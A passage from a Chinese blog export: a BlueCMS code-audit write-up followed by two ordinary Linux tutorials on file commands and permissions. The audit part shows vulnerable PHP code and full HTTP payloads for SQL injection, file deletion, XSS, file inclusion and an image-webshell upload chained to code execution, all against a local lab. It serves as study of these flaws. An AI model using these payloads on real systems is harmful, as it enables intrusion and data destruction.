$_SESSION['user_id'] ? $_SESSION['user_id'] : 0; $rid = intval($_POST['rid']); $content = !empty($_POST['content']) ? htmlspecialchars($_POST['content']) : ''; $content = nl2br($content); if(empty($content)) &#123; showmsg('评论内容不能为空'); &#125; $sql = \"INSERT INTO \" . table('guest_book') . \" (id, rid, user_id, add_time, ip, content) VALUES ('', '$rid', '$user_id', '$timestamp', '$online_ip', '$content')\"; $db-&gt;query($sql); showmsg('恭喜您留言成功', 'guest_book.php?page_id='.$_POST['page_id']);&#125; 构造payload如下： 12345678910111213141516POST /guest_book.php?act=send HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/ann.php?cid=1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=5X-Forwarded-For:1&apos;+(select case when(ascii(substr(database(),1,1))=98) then sleep(1) else 1 end),&apos;1&apos;)# Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 15rid=1&amp;content=1 3.任意文件跳转漏洞/user.php文件第112行通过控制变量$from可进行任意文件跳转 12$from = !empty($from) ? base64_decode($from) : &apos;user.php&apos;;showmsg(&apos;欢迎您 &apos;.$user_name.&apos; 回来，现在将转到...&apos;, $from); 前面我们已经分析了showmsg函数的作用是页面跳转，同时注意这里$from有经过base64解密，我们通过登录用户，抓取登录包，其实就可以发现$from变量，我们假设跳转到根目录下的robots.txt文件，将robots.txt进行base64编码 payload如下： 12345678910111213141516POST /user.php HTTP/1.1Host: 127.0.0.1Content-Length: 108Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/user.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3Connection: closereferer=&amp;user_name=user02&amp;pwd=user02&amp;safecode=xipt&amp;useful_time=604800&amp;submit=%B5%C7%C2%BC&amp;from=cm9ib3RzLnR4dA==&amp;act=do_login 登录成功后跳转到robots.txt页面 4.任意文件删除漏洞/user.php第616行存在未过滤变量$_POST[&#39;lit_pic&#39;]，导致任意文件删除漏洞 123if (file_exists(BLUE_ROOT.$_POST['lit_pic'])) &#123; @unlink(BLUE_ROOT.$_POST['lit_pic']);&#125; payload： 1234567891011121314POST /user.php?act=do_info_edit HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=4Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 58post_id=1&amp;title=1&amp;link_man=1&amp;link_phone=1&amp;lit_pic=demo.php 同样/admin/flash.php第62-63行存在未过滤变量$_POST[&#39;image_path2&#39;]，导致任意文件删除漏洞 123if(file_exists(BLUE_ROOT.$_POST['image_path2']))&#123; @unlink(BLUE_ROOT.$_POST['image_path2']);&#125; payload： 1234567891011121314POST /admin/flash.php?act=do_edit HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=5Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 31image_id=1&amp;image_path2=demo.php 5.反射型XSS/admin/card.php第57行存在可利用的变量$name导致的反射型xss漏洞 12$name = !empty($_POST['name']) ? trim($_POST['name']) : '';showmsg('编辑充值卡 '.$name.' 成功', 'card.php'); payload： 12345678910111213141516POST /admin/card.php HTTP/1.1Host: 127.0.0.1Content-Length: 99Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/admin/card.php?act=edit&amp;id=1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; detail=4; BLUE[user_id]=2; BLUE[user_name]=user01; BLUE[user_pwd]=30f21397b842ad32aaeae277d571edcdConnection: closename=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E&amp;value=100&amp;price=30&amp;is_close=0&amp;id=1&amp;act=do_edit 弹框后跳转至card.php 6.存储型XSS这个漏洞挺难发现的，我也是看别人的文章才学习到的，我们在审计时应该有注意在/user.php中的注册功能下有一个函数uc_user_register，跟踪该函数： 123function uc_user_register($username, $password, $email, $questionid = '', $answer = '') &#123; return call_user_func(UC_API_FUNC, 'user', 'register', array('username'=&gt;$username, 'password'=&gt;$password, 'email'=&gt;$email, 'questionid'=&gt;$questionid, 'answer'=&gt;$answer));&#125; 我们应该都会很奇怪这个UD_API_FUNC到底是什么鬼，查询一下其实就是一个引擎检查用户输入是否合法返回对应的uid，具体我们没必要深究下去，总之他是一个检查机制 而回到/user.php的编辑个人资料功能的代码下，我们惊奇的发现这个功能里，我们输入修改的资料信息后，直接将信息更新到了数据库中，并没有通过上面那个引擎对我们的输入进行合法性检查，所以我们就可以利用这个功能，进行存储型的XSS攻击 payload： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273POST /user.php HTTP/1.1Host: 127.0.0.1Content-Length: 1475Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOit6AnMUCD0FejzBUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/user.php?act=my_infoAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=3; BLUE[user_name]=user02; BLUE[user_pwd]=1e6a32c00852bd4dbf303ab4d54a1380; detail=4Connection: close------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;face_pic1&quot;------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;face_pic2&quot;; filename=&quot;&quot;Content-Type: application/octet-stream------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;birthday&quot;2019-03-14------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;sex&quot;0------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;email&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;msn&quot;------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;qq&quot;------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;office_phone&quot;------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;home_phone&quot;------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;mobile_phone&quot;------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;address&quot;------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;act&quot;edit_user_info------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;submit&quot;È·ÈÏÐÞ¸Ä------WebKitFormBoundaryOit6AnMUCD0FejzBContent-Disposition: form-data; name=&quot;face_pic3&quot;------WebKitFormBoundaryOit6AnMUCD0FejzB-- 编辑成功后跳转回用户信息界面，每次访问都会触发弹框，因为我们编辑用户邮箱为&lt;script&gt;alert(/xss/)&lt;/script&gt; 7.任意文件包含漏洞这个漏洞也是通过审计工具才知道的，在/user.php第750行： 12345678910elseif ($act == 'pay')&#123; include 'data/pay.cache.php'; $price = $_POST['price']; $id = $_POST['id']; $name = $_POST['name']; if (empty($_POST['pay'])) &#123; showmsg('对不起，您没有选择支付方式'); &#125; include 'include/payment/'.$_POST['pay'].\"/index.php\";&#125; 变量$_POST[&#39;pay&#39;]拼接到include函数中，且只有开头包含文件的转义过滤处理，我们可以使用0x00或文件长度截断方式进行过滤，本次审计的环境是PHP5.2.17，如果环境为5.4以上那么上述两种方法无效，不存在任意文件包含漏洞，但是为了更好理解漏洞，我还是将环境设为5.3以下 包含根目录下robots.txt的payload如下： 1234567891011121314POST /user.php?act=pay HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; detail=1; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 632pay=../../robots.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................... 这里我使用了字符.来进行文件长度截断 有了文件包含漏洞，我们接着就可以考虑是不是上传图片马，这样就能成功执行shell，所以接下来我们找一个可以上传文件的页面：/admin/flash.php 12345678910111213141516elseif($act == 'do_add')&#123; $image_link = !empty($_POST['image_link']) ? trim($_POST['image_link']) : ''; $show_order = !empty($_POST['show_order']) ? intval($_POST['showorder']) : ''; if(isset($_FILES['image_path']['error']) &amp;&amp; $_FILES['image_path']['error'] == 0)&#123; $image_path = $image-&gt;img_upload($_FILES['image_path'],'flash'); &#125; if($image_path == '')&#123; showmsg('上传图片出错', true); &#125; $image_path = empty($image_path) ? '' : $image_path; if(!$db-&gt;query(\"INSERT INTO \".table('flash_image').\" (image_id, image_path, image_link, show_order) VALUES ('', '$image_path', '$image_link', '$show_order')\"))&#123; showmsg('添加flash图片出错', true); &#125;else&#123; showmsg('添加flash图片成功', 'flash.php', true); &#125; &#125; 我们跟踪一下img_upload函数，定位到/include/upload.class.php 123456789101112131415161718192021222324252627private $allow_image_type = array('image/jpeg', 'image/gif', 'image/png', 'image/pjpeg'); private $extension_name_arr = array('jpg', 'gif', 'png', 'pjpeg');function img_upload($file, $dir = '', $imgname = '')&#123; ... if(!in_array($file['type'],$this-&gt;allow_image_type))&#123; echo '&lt;font style=\"color:red;\"&gt;不允许的图片类型&lt;/font&gt;'; exit; &#125; if(empty($imgname))&#123; $imgname = $this-&gt;create_tempname().'.'.$this-&gt;get_type($file['name']); &#125;&#125;function get_type($filepath)&#123; $pos = strrpos($filepath,'.'); echo $pos; if($pos !== false)&#123; $extension_name = substr($filepath,$pos+1); &#125; //echo $extension_name; if(!in_array($extension_name, $this-&gt;extension_name_arr))&#123; echo '&lt;font style=\"color:red;\"&gt;您上传的文件不符合要求,请重试&lt;/font&gt;'; exit; &#125; return $extension_name;&#125; 该文件对上传文件进行文件类型和文件名的白名单检测，但是没有对文件内容进行检查，所以我们能轻易上传一个图片马 payload为： 123456789101112131415161718192021222324252627282930313233POST /admin/flash.php HTTP/1.1Host: 127.0.0.1Content-Length: 499Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBbgiY0h0EVXwpD7bUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/admin/flash.php?act=addAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; detail=1; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6Connection: close------WebKitFormBoundaryBbgiY0h0EVXwpD7bContent-Disposition: form-data; name=&quot;image_path&quot;; filename=&quot;info.jpg&quot;Content-Type: image/jpeg&lt;?php phpinfo(); ?&gt;------WebKitFormBoundaryBbgiY0h0EVXwpD7bContent-Disposition: form-data; name=&quot;image_link&quot;1------WebKitFormBoundaryBbgiY0h0EVXwpD7bContent-Disposition: form-data; name=&quot;show_order&quot;0------WebKitFormBoundaryBbgiY0h0EVXwpD7bContent-Disposition: form-data; name=&quot;act&quot;do_add------WebKitFormBoundaryBbgiY0h0EVXwpD7b-- 上传成功后我们可以通过管理员界面得知上传文件所在目录为data/upload/flash/15525638906.jpg 我们再通过文件包含漏洞执行该图片马 payload： 1234567891011121314POST /user.php?act=pay HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; detail=1; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0pay=../../data/upload/flash/15525638906.jpg........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................ 成功执行webshell 总结总的来说，这次代码审计虽然花的时间比较久，但是收获了审计的思路，从一开始看到一个陌生的cms不知从何下手到慢慢有思路，有方法的审计，这个过程还是挺开心的，相信只要花时间有耐心，一定能提高自己的审计能力，最后附上参考文章： 一名代码审计新手的实战经历与感悟 从小众blueCMS入坑代码审计","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/tags/代码审计/"}]},{"title":"Linux文件与目录管理","slug":"Linux文件与目录管理","date":"2019-03-07T13:22:00.000Z","updated":"2019-03-14T12:00:06.872Z","comments":true,"path":"/posts/5187/","link":"","permalink":"https://Foxgrin.github.io/posts/5187/","excerpt":"包括在不同的目录间切换，建立与删除目录，建立与删除文件，查看文件内容等","text":"包括在不同的目录间切换，建立与删除目录，建立与删除文件，查看文件内容等 一.目录与路径1.相对路径与绝对路径绝对路径：路径写法一定由根目录/写起，例如：/usr/share/doc这个目录 相对路径：路径写法不是由根目录写起，指相对于当前工作目录的路径，例如：cd ../usr 2.目录的相关操作（1）切换目录：cd命令123456cd [相对路径或绝对路径]cd . #代表此层目录cd .. #代表上一层目录cd ~ #代表目前使用者身份所在的家目录cd - #代表前一个工作目录cd ~account #代表account这个使用者的家目录 （2）显示当前所在目录：pwd命令12root@ubuntu:/var/www# pwd/var/www （3）建立新目录：mkdir命令1234567891011121314root@ubuntu:/tmp# mkdir testroot@ubuntu:/tmp# ls -dl testdrwxr-xr-x 2 root root 4096 Mar 7 05:37 testroot@ubuntu:/tmp# mkdir -p test1/test2/test3/test4 #-p代表递归建立目录root@ubuntu:/tmp# ls -dl test*drwxr-xr-x 2 root root 4096 Mar 7 05:37 testdrwxr-xr-x 3 root root 4096 Mar 7 05:42 test1root@ubuntu:/tmp# mkdir -m 711 test2 #-m代表指定目录权限root@ubuntu:/tmp# ls -dl test*drwxr-xr-x 2 root root 4096 Mar 7 05:37 testdrwxr-xr-x 3 root root 4096 Mar 7 05:42 test1drwx--x--x 2 root root 4096 Mar 7 05:43 test2 （4）删除目录：rmdir命令1234567891011root@ubuntu:/tmp# rmdir testroot@ubuntu:/tmp# ls -dl test*drwxr-xr-x 3 root root 4096 Mar 7 05:42 test1drwx--x--x 2 root root 4096 Mar 7 05:43 test2root@ubuntu:/tmp# rmdir test1rmdir: failed to remove `test1&apos;: Directory not empty #test1目录尚有内容，无法删除root@ubuntu:/tmp# rmdir -p test1/test2/test3/test4 #-p连通上层目录一起删除root@ubuntu:/tmp# ls -dl test*drwx--x--x 2 root root 4096 Mar 7 05:43 test2 二.文件与目录管理1.文件与目录的查看：ls命令123ls -a 显示全部文件，包括隐藏文件ls -d 仅列出目录本身，而不是列出目录内的文件数据ls -l 详细信息显示，包括文件的属性与权限等数据 2.文件或目录的复制命令：cp命令12345678910root@ubuntu:~# cp .bashrc /tmp/test/bashrcroot@ubuntu:~# ls /tmp/testbashrcroot@ubuntu:~# cp -i .bashrc /tmp/test/bashrc #-i：若目标文件以及存在时，在覆盖时会先询问操作的进行cp: overwrite `/tmp/test/bashrc&apos;? yroot@ubuntu:~# cp -a .bashrc /tmp/test/bashrc2 #-a：连同文件属性也一起复制过去root@ubuntu:~# ls -l /tmp/test/bashrc2 .bashrc-rw-r--r-- 1 root root 3106 Apr 19 2012 .bashrc-rw-r--r-- 1 root root 3106 Apr 19 2012 /tmp/test/bashrc2 1234567891011root@ubuntu:/tmp# ls -dl test*drwxr-xr-x 2 root root 4096 Mar 7 06:07 testdrwxr-xr-x 2 root root 4096 Mar 7 18:11 test1root@ubuntu:/tmp# ls test1root@ubuntu:/tmp# cp test test1cp: omitting directory `test&apos;root@ubuntu:/tmp# cp -r test test1 #-r：如果是目录的复制需要加上-r的选项root@ubuntu:/tmp# ls test1testroot@ubuntu:/tmp# ls test1/testbashrc bashrc1 bashrc2 3.文件或目录的删除命令：rm命令123456789root@ubuntu:/tmp# rm test2rm: cannot remove `test2&apos;: Is a directoryroot@ubuntu:/tmp# rm -r test2 #当删除目录时，需要加上-r选项root@ubuntu:/tmp# ls -dl test*drwxr-xr-x 2 root root 4096 Mar 7 06:07 testdrwxr-xr-x 3 root root 4096 Mar 7 18:12 test1root@ubuntu:/tmp# rm -ir test #加入-i选项，删除前会询问操作者是否操作，避免误删除rm: descend into directory `test&apos;? ^C #按下[ctrl]+c中断删除操作 4.移动文件或目录命令或重命名：mv命令12345678910111213141516171819202122232425root@ubuntu:~/tmp# mkdir mvtestroot@ubuntu:~/tmp# cp ~/.bashrc bashrcroot@ubuntu:~/tmp# lsbashrc mvtestroot@ubuntu:~/tmp# mv bashrc mvtest #将bashrc文件移动到mvtest目录下root@ubuntu:~/tmp# lsmvtestroot@ubuntu:~/tmp# ls mvtestbashrcroot@ubuntu:~/tmp# lsmvtest mvtest2root@ubuntu:~/tmp# mv mvtest mvtest2 #将mvtest目录移动到mvtest2目录下root@ubuntu:~/tmp# lsmvtest2root@ubuntu:~/tmp# ls mvtest2mvtestroot@ubuntu:~/tmp# mv mvtest2 mvtest1 #将mvtest2目录重命名为mvtest1目录root@ubuntu:~/tmp# lsmvtest1root@ubuntu:~/tmp# ls mvtest1/mvtestroot@ubuntu:~/tmp# ls mvtest1/mvtest/bashrc 5.获取路径的文件名与目录名称：basename命令和dirname命令1234root@ubuntu:~# basename /etc/sysconfig/networknetwork #获取最后的文件名root@ubuntu:~# dirname /etc/sysconfig/network/etc/sysconfig #获取目录名 三.文件内容查看1.直接查看文件内容：cat，tac，nl命令123root@ubuntu:~# cat /etc/passwd #从第一行开始显示文件内容root@ubuntu:~# tac /etc/passwd #从最后一行开始显示文件内容root@ubuntu:~# nl /etc/passwd #在文件内容前加上行号 2.可翻页查看：more，less命令cat命令是将文件内容一次性显示出来，没有一页一页翻动的功能，而more和less命令具有一页一页翻动的功能 在more命令按以下键的功能： 1234空格键（space）：代表向下翻一页Enter：代表向下翻一行b或[ctrl]-b：代表往回翻页q：代表立刻离开more，不再显示该文件内容 在less命令按以下键的功能： 1234空格键：向下翻动一页[pagedown]：向下翻动一行[pageup]：向上翻动一行q：离开less程序 3.数据截取：head，tail命令head命令能取出一个文件的前几行，tail则是取出文件的后几行 123456789head [-n number] 文件root@ubuntu:~# head /etc/manpath.config #默认显示前十行root@ubuntu:~# head -n 20 /etc/manpath.config #显示前二十行root@ubuntu:~# head -n -100 /etc/manpath.config #后一百行不会显示出来tail [-n number]文件root@ubuntu:~# tail /etc/manpath.config #默认显示最后十行root@ubuntu:~# tail -n 20 /etc/manpath.config #显示最后二十行root@ubuntu:~# tail -n +100 /etc/manpath.config #后一百行显示出来 4.非纯文本文件读取：od命令12od [-t TYPE] 文件可读取二进制等文件 5.创建文件：touch命令1touch 文件名 四.文件默认权限：umask当我们建立一个新的文件或目录时，它的默认权限与umask有关，它指定了目前用户在建立文件或目录时候的权限默认值，得知umask的方法： 1234root@ubuntu:~/tmp# umask0022root@ubuntu:~/tmp# umask -Su=rwx,g=rx,o=rx 查看的方式有两种，一种可以直接输入umask，就可以看到数字类型的权限设置值，另一种则是加入-S这个选项，就会以符号类型的方式来显示出权限了 但是要注意的是，这里umask的值并不直接是文件或目录的默认权限值，它规定的是是默认值需要减掉的权限，文件的默认权限值为：-rw-rw-rw-，即666；目录的默认权限值为drwxrwxrwx，即777，再减去umask指定的值，那么 12建立文件时：(-rw-rw-rw-) - (-----w--w-) ==&gt; -rw-r--r--建立目录时：(drwxrwxrwx) - (d----w--w-) ==&gt; drwxr-xr-x 测试一下： 12345root@ubuntu:~/tmp# touch test1root@ubuntu:~/tmp# mkdir test2root@ubuntu:~/tmp# ls -dl test*-rw-r--r-- 1 root root 0 Mar 10 06:05 test1drwxr-xr-x 2 root root 4096 Mar 10 06:05 test2 修改umask值的方式如下： 123456root@ubuntu:~/tmp# umask 002root@ubuntu:~/tmp# touch test3root@ubuntu:~/tmp# mkdir test4root@ubuntu:~/tmp# ls -dl test[34]-rw-rw-r-- 1 root root 0 Mar 10 06:16 test3drwxrwxr-x 2 root root 4096 Mar 10 06:16 test4 五.文件隐藏属性123456789101112131415A ：当设定了 A 这个属性时，若你有存取此档案(或目录)时，他的访问时间 atime 将不会被修改，可避免I/O较慢的机器过度的存取磁盘。这对速度较慢的计算机有帮助S ：一般档案是异步写入磁盘的(原理请参考第五章sync的说明)，如果加上 S 这个 属性时，当你进行任何档案的修改，该更动会『同步』写入磁盘中。a ：当设定 a 之后，这个档案将只能增加数据，而不能删除也不能修改数据，只有root 才能设定这个属性。 c ：这个属性设定之后，将会自动的将此档案『压缩』，在读取的时候将会自动解压缩， 但是在储存的时候，将会先进行压缩后再储存(看来对于大档案似乎蛮有用的！)d ：当 dump 程序被执行的时候，设定 d 属性将可使该档案(或目录)不会被 dump 备份i ：这个 i 可就很厉害了！他可以让一个档案『不能被删除、改名、设定连结也无法 写入或新增资料！』对于系统安全性有相当大的帮助！只有 root 能设定此属性s ：当档案设定了 s 属性时，如果这个档案被删除，他将会被完全的移除出这个硬盘 空间，所以如果误删了，完全无法救回来了喔！u ：与 s 相反的，当使用 u 来配置文件案时，如果该档案被删除了，则数据内容其实还 存在磁盘中，可以使用来救援该档案喔！ 1.设置文件隐藏属性：chattr命令12345chattr [+-=][ASacdistu] 档案或目录名称选项与参数：+ ：增加某一个特殊参数，其他原本存在参数则不动。- ：移除某一个特殊参数，其他原本存在参数则不动。= ：设定一定，且仅有后面接的参数 123root@ubuntu:~/tmp# chattr +i test3root@ubuntu:~/tmp# rm test3rm: cannot remove `test3&apos;: Operation not permitted 由于对文件test3附加了i的隐藏属性，所以无法删除 2.显示文件隐藏属性：lsattr命令12345lsattr [-adR] 档案或目录选项与参数：-a ：将隐藏文件的属性也秀出来；-d ：如果接的是目录，仅列出目录本身的属性而非目录内的文件名；-R ：连同子目录的数据也一并列出来！ 12root@ubuntu:~/tmp# lsattr test3----i--------e- test3 六.观察文件类型：file命令1234root@ubuntu:~/tmp# file ~/.bashrc /root/.bashrc: ASCII English textroot@ubuntu:~/tmp# file /usr/bin/passwd/usr/bin/passwd: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xc101d30ff4513f2dbad17fcc483dcda4a38e1df0, stripped 七.命令与文件的查找1.脚本文件的查找：which命令123456789which [-a] command选项与参数：-a：将所有由PATH目录中科院找到的命令均列出，而不止第一个被找到的命令名称root@ubuntu:~/tmp# which passwd/usr/bin/passwdroot@ubuntu:~/tmp# which ls/bin/lsroot@ubuntu:~/tmp# which cd 可以发现有的命令是找不到的，因为which是默认找PATH内所规范的路径，去查找执行文件的文件名 2.文件的查找：whereis，locate/updatedb，find命令whereis由一些特定的目录查找文件 12345678910whereis [-bmsu] 文件或目录名 -b 只查找二进制文件。-B&lt;目录&gt; 只在设置的目录下查找二进制文件。-f 不显示文件名前的路径名称。-m 只查找说明文件。-M&lt;目录&gt; 只在设置的目录下查找说明文件。-s 只查找原始代码文件。-S&lt;目录&gt; 只在设置的目录下查找原始代码文件。-u 查找不包含指定类型的文件。 locate是在已建立的数据库/var/lib/mlocate里面的数据所查找到的，不用再去硬盘当中读取数据，所以较为快速，数据库默认一天更新一次，如果要手动更新数据库，需要输入updatedb命令 1234locate [-ir] keyword-i：忽略大小写的差异-l：仅输出几行的意思 find 123root@ubuntu:~/tmp# find /var -mtime +4 #+4代表大于等于5天前的文件root@ubuntu:~/tmp# find /var -mtime -4 #-4代表小于等于4天内的文件root@ubuntu:~/tmp# find /var -mtime 4 #4-5那一天的文件","categories":[{"name":"Linux","slug":"Linux","permalink":"https://Foxgrin.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://Foxgrin.github.io/tags/Linux/"}]},{"title":"Linux的文件权限与目录配置","slug":"Linux的文件权限与目录配置","date":"2019-03-06T10:16:00.000Z","updated":"2019-03-14T12:00:06.873Z","comments":true,"path":"/posts/26833/","link":"","permalink":"https://Foxgrin.github.io/posts/26833/","excerpt":"Linux一般将文件可读写的身份分为3个类别，分别是拥有者（owner），所属群组（group），其他人（others），且三种身份各有读（read），写（write），执行（execute）等权限。","text":"Linux一般将文件可读写的身份分为3个类别，分别是拥有者（owner），所属群组（group），其他人（others），且三种身份各有读（read），写（write），执行（execute）等权限。 用户与用户组1.文件拥有者即用户，通常分为root和一般身份的用户，所有用户的相关信息都记录在/etc/passwd这个文件内，用户的密码则是记录在etc/shadow文件中 2.用户组用户组中有若干用户，组名记录在/etc/group文件中 3.其他人Linux文件权限概念1.Linux文件属性使用ls -al命令查看当前目录下的所有文件（包括以.开头的隐藏文件）和目录及其相关属性与权限 123456789101112131415161718root@ubuntu:~# ls -altotal 64drwx------ 11 root root 4096 Mar 5 19:43 .drwxr-xr-x 24 root root 4096 Apr 8 2018 ..-rw------- 1 root root 391 Mar 5 22:59 .bash_history-rw-r--r-- 1 root root 3106 Apr 19 2012 .bashrcdrwx------ 3 root root 4096 Apr 8 2018 .cachedrwx------ 6 root root 4096 Apr 8 2018 .configdrwx------ 3 root root 4096 Dec 30 00:28 .dbusdrwx------ 2 root root 4096 Apr 23 2018 .gconfdrwx------ 2 root root 4096 Apr 8 2018 .gvfsdrwxr-xr-x 3 root root 4096 Apr 8 2018 .localdrwxr-xr-x 2 root root 4096 May 15 2018 .oracle_jre_usage-rw-r--r-- 1 root root 140 Apr 19 2012 .profiledrwx------ 2 root root 4096 Dec 29 22:32 .pulse-rw------- 1 root root 256 Apr 8 2018 .pulse-cookiedrwxr-xr-x 3 root root 4096 May 15 2018 .swt-rw------- 1 root root 858 Mar 5 19:43 .viminfo 以.config文件为例说明： 12drwx------ 6 root root 4096 Apr 8 2018 .config[ 1 ] [2] [3] [4] [5] [ 6 ] [ 7 ] 信息分为7栏，每栏的意义如下： 1234567[1]：文件类型权限[2]：链接数[3]：文件拥有者[4]：文件所属用户组[5]：文件大小[6]：文件最后被修改的时间[7]：文件名 第一栏：文件类型权限共有十个字符 第一个字符代表这个文件是目录，文件或链接文件等 [d]代表目录，[-]代表文件，[l]表示链接文件 